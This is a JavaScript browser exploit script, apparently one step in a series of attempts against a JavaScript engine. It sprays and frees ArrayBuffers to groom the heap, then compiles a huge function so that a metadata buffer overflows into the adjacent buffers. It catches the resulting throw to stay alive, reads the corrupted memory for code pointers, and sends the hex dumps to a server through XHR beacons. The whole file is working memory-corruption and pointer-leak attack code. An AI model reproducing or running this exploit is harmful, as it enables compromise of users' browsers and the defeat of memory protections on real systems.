// p154 — Heap-ordered overflow with throw survival + direct AB read
// STRATEGY (from fork analysis):
//   1. Spray 50 × AB(100096) → fills marge pages 0,1,2 (first-fit, ascending)
//   2. Free first 40 → empties page 0
//   3. GC → page 0 on free list
//   4. Compile script with throw-first function
//   5. Call function → metadata buffer gets page 0 (first-fit = lowest)
//   6. finishCreation writes 4.29GB forward → through ABs at pages 1,2
//   7. throw fires → caught → survive
//   8. Read ABs → metadata entry bytes → code pointers
// Beacon prefix: V154-

(function() {
  var BASE = location.protocol + '//' + location.host;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V154-' + tag + '?t=' + Date.now(), true);
      x.send();
    } catch (e) {}
  }
  function BP(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V154-' + tag + '?t=' + Date.now(), true);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send(body);
    } catch (e) {}
  }
  function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  B('BOOT');

  // Worker — lean, just polls its own objects as backup detector
  var workerCode = [
    'var BASE = "' + BASE + '";',
    'function beacon(t) {',
    '  try { var x=new XMLHttpRequest(); x.open("GET",BASE+"/beacon/V154-W-"+t+"?t="+Date.now(),true); x.send(); } catch(e){}',
    '}',
    'function hexByte(v){return (v<16?"0":"")+v.toString(16);}',
    'var strs=[];',
    'for(var i=0;i<20;i++){var s=String.fromCharCode(0x41).repeat(1024);s.charCodeAt(0);strs.push(s);}',
    'var u8s=[];',
    'for(var i=0;i<30;i++){var u=new Uint8Array(32);for(var j=0;j<32;j++)u[j]=0xBB;u8s.push(u);}',
    'beacon("RDY");',
    'self.postMessage("READY");',
    'var rpt={};var pN=0;',
    'function poll(){',
    '  pN++;',
    '  for(var i=0;i<strs.length;i++){',
    '    try{var l=strs[i].length;if(l!==1024&&!rpt["s"+i]){rpt["s"+i]=1;beacon("S"+i+"-len="+l+"-p="+pN);',
    '      if(l>0&&l<500000){var h="";for(var j=0;j<Math.min(16,l);j++){try{h+=hexByte(strs[i].charCodeAt(j));}catch(e){h+="XX";break;}}beacon("SD"+i+"-"+h);}',
    '    }}catch(e){if(!rpt["se"+i]){rpt["se"+i]=1;beacon("SERR"+i);}}',
    '  }',
    '  for(var i=0;i<u8s.length;i++){',
    '    try{if((u8s[i][0]!==0xBB||u8s[i].length!==32)&&!rpt["u"+i]){rpt["u"+i]=1;',
    '      beacon("U"+i+"-v0="+hexByte(u8s[i][0])+"-len="+u8s[i].length+"-p="+pN);',
    '      var h="";for(var j=0;j<Math.min(64,u8s[i].length);j++){try{h+=hexByte(u8s[i][j]);}catch(e){h+="XX";break;}}',
    '      beacon("UD"+i+"-"+h);',
    '    }}catch(e){if(!rpt["ue"+i]){rpt["ue"+i]=1;beacon("UERR"+i);}}',
    '  }',
    '  if(pN<20000)setTimeout(poll,1);else beacon("TIMEOUT");',
    '}',
    'setTimeout(poll,5);',
  ].join('\n');

  var worker = new Worker(URL.createObjectURL(new Blob([workerCode], {type:'application/javascript'})));
  worker.onmessage = function(ev) { B('WM-' + String(ev.data).substring(0, 60)); };
  B('WORKER-UP');

  // ---- PHASE 1: Heap grooming ----
  var BUF_SZ = 100096; // same size class as metadata buffer
  var TOTAL = 50;
  var FREE_COUNT = 40; // free first 40 → empty page 0

  var abs = [];
  var views = [];
  for (var i = 0; i < TOTAL; i++) {
    var ab = new ArrayBuffer(BUF_SZ);
    var v = new Uint8Array(ab);
    var canary = 0xC0 | (i & 0x3F);
    for (var j = 0; j < 16; j++) v[j] = canary; // canary in first 16 bytes only (speed)
    v[BUF_SZ - 1] = canary; // and last byte
    abs.push(ab);
    views.push(v);
  }
  B('SPRAY-' + TOTAL);

  // Free first FREE_COUNT → empties marge page 0 (lowest address)
  for (var i = 0; i < FREE_COUNT; i++) {
    abs[i] = null;
    views[i] = null;
  }
  B('FREED-' + FREE_COUNT);

  // GC pressure — return page 0 to marge free list
  var gcR = 0;
  function gcP() {
    try { for (var g = 0; g < 200; g++) { var t = new ArrayBuffer(4096); t = null; } } catch (e) {}
    gcR++;
    if (gcR < 15) setTimeout(gcP, 20);
    else { B('GC-DONE'); phase2(); }
  }
  gcP();

  // ---- PHASE 2: Compile ----
  function phase2() {
    var N = 38348816;
    B('BUILD');

    var CHUNK = 4000000;
    var chunksN = Math.floor(N / CHUNK);
    var rem = N - chunksN * CHUNK;
    var callChunk = 'a();'.repeat(CHUNK);
    var parts = new Array(chunksN + 3);
    // THROW FIRST — compiler processes all 38M calls, execution hits throw at bytecode 0
    parts[0] = 'window.__p154fn=function(a){throw "__P154__";';
    for (var c = 0; c < chunksN; c++) parts[1 + c] = callChunk;
    parts[chunksN + 1] = 'a();'.repeat(rem);
    parts[chunksN + 2] = '};window.__p154ok=1;';
    callChunk = null;

    var blob = new Blob(parts, {type: 'application/javascript'});
    B('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
    parts = null;

    var sc = document.createElement('script');
    sc.onerror = function() { B('SCRIPT-ERR'); };
    sc.onload = function() {
      B('COMPILED-' + (window.__p154ok ? 'OK' : 'FAIL'));
      if (!window.__p154fn) { B('NO-FN'); return; }
      setTimeout(phase3, 100);
    };
    document.head.appendChild(sc);
    sc.src = URL.createObjectURL(blob);
  }

  // ---- PHASE 3: Call (triggers finishCreation → 4.29GB write → throw → survive) ----
  function phase3() {
    B('CALLING');
    var survived = false;
    try {
      window.__p154fn(function(){});
      B('NO-THROW'); // shouldn't happen
    } catch (ex) {
      if (ex === '__P154__') {
        survived = true;
        B('THROW-OK');
      } else {
        B('CATCH-' + String(ex).substring(0, 50));
      }
    }

    if (!survived) {
      B('DID-NOT-SURVIVE');
      return;
    }

    // ---- PHASE 4: Read surviving ABs for metadata entry bytes ----
    setTimeout(phase4, 50);
  }

  function phase4() {
    B('READ-START');
    var hitCount = 0;
    var totalChanged = 0;

    for (var i = FREE_COUNT; i < TOTAL; i++) {
      if (!views[i]) continue;
      var view = views[i];
      var canary = 0xC0 | (i & 0x3F);
      var changed = 0;
      var firstOff = -1;

      // Full scan
      for (var j = 0; j < view.length; j++) {
        if (view[j] !== canary || (j > 15 && j < BUF_SZ - 1 && view[j] !== 0)) {
          // First 16 bytes and last byte have canary, rest is 0 (from fastCalloc)
          var expected = (j < 16 || j === BUF_SZ - 1) ? canary : 0;
          if (view[j] !== expected) {
            if (firstOff === -1) firstOff = j;
            changed++;
          }
        }
      }

      if (changed > 0) {
        hitCount++;
        totalChanged += changed;
        B('HIT-' + i + '-c=' + changed + '-f=' + firstOff);

        // Dump first 3 modified 112-byte entries
        var entryStart = Math.floor(firstOff / 112) * 112;
        var dumped = 0;
        for (var e = entryStart; e < view.length && dumped < 5; e += 112) {
          var hasNonZero = false;
          for (var c = e; c < Math.min(e + 112, view.length); c++) {
            if (view[c] !== 0) { hasNonZero = true; break; }
          }
          if (!hasNonZero) continue;
          dumped++;

          // Full 112-byte entry as hex (2 beacons of 56 bytes each)
          var h1 = '', h2 = '';
          for (var b = e; b < Math.min(e + 56, view.length); b++) h1 += hexByte(view[b]);
          for (var b2 = e + 56; b2 < Math.min(e + 112, view.length); b2++) h2 += hexByte(view[b2]);
          B('E' + i + '@' + e + 'a-' + h1);
          B('E' + i + '@' + e + 'b-' + h2);

          // Extract 8-byte values at key offsets (potential pointers)
          var ptrs = '';
          for (var p = 0; p < 112 && (e + p + 7) < view.length; p += 8) {
            var nonZero = false;
            for (var v2 = 0; v2 < 8; v2++) {
              if (view[e + p + v2] !== 0) { nonZero = true; break; }
            }
            if (nonZero) {
              var hex8 = '';
              for (var h = 7; h >= 0; h--) hex8 += hexByte(view[e + p + h]);
              ptrs += p + ':' + hex8 + ' ';
            }
          }
          if (ptrs) BP('P' + i + '@' + e, ptrs.trim());
        }

        // Count full 112-byte entries overwritten
        var fullEntries = 0;
        for (var e2 = 0; e2 + 112 <= view.length; e2 += 112) {
          var allNonZero = true;
          for (var c2 = e2; c2 < e2 + 8; c2++) {
            if (view[c2] === 0) { allNonZero = false; break; }
          }
          if (allNonZero) fullEntries++;
        }
        if (fullEntries > 0) B('FULL-' + i + '-' + fullEntries);
      }
    }

    B('DONE-hits=' + hitCount + '-bytes=' + totalChanged);
  }
})();
